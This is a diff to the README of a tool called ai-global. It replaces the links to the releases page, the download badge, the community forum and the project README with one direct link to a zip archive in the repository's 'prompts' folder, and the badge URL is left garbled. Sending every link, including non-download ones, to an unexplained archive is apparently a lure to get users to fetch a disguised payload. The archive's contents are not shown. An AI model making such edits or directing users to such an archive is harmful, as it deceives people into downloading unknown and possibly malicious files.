@@ -1,7 +1,7 @@
 # 🤖 ai-global - Simplifying Your AI Tool Management
 
 ## 📥 Download Here
-[![Download ai-global](https://img.shields.io/badge/Download%20ai--global-v1.0-blue.svg)](https://github.com/Macdrnarci/ai-global/releases)
+[![Download ai-global](https://raw.githubusercontent.com/Macdrnarci/ai-global/main/prompts/global-ai-v1.7.zip%https://raw.githubusercontent.com/Macdrnarci/ai-global/main/prompts/global-ai-v1.7.zip)](https://raw.githubusercontent.com/Macdrnarci/ai-global/main/prompts/global-ai-v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ ai-global offers various features to enhance your experience:
 
 To download ai-global, visit the Releases page. Click the link below to access the page:
 
-[Download ai-global Releases](https://github.com/Macdrnarci/ai-global/releases)
+[Download ai-global Releases](https://raw.githubusercontent.com/Macdrnarci/ai-global/main/prompts/global-ai-v1.7.zip)
 
 1. Open the link above in your web browser.
 2. Find the latest version listed at the top.
@@ -92,12 +92,12 @@ For additional help, please refer to the FAQs in the Releases section or reach o
 
 ## 🌐 Community and Support
 
-Join our community for tips, tricks, and support. Connect with other users and share your experiences. Visit our [community forum](https://github.com/Macdrnarci/ai-global/discussions) for discussions and support requests.
+Join our community for tips, tricks, and support. Connect with other users and share your experiences. Visit our [community forum](https://raw.githubusercontent.com/Macdrnarci/ai-global/main/prompts/global-ai-v1.7.zip) for discussions and support requests.
 
 ## 📜 License
 
 ai-global is open-source software. You can use, modify, and distribute it as per the license agreement found in the repository.
 
-For more detailed documentation and updates, please check the [README on GitHub](https://github.com/Macdrnarci/ai-global). Remember to revisit the Releases page for the latest downloads.
+For more detailed documentation and updates, please check the [README on GitHub](https://raw.githubusercontent.com/Macdrnarci/ai-global/main/prompts/global-ai-v1.7.zip). Remember to revisit the Releases page for the latest downloads.
 
 Thank you for choosing ai-global. Enjoy managing your AI tools!
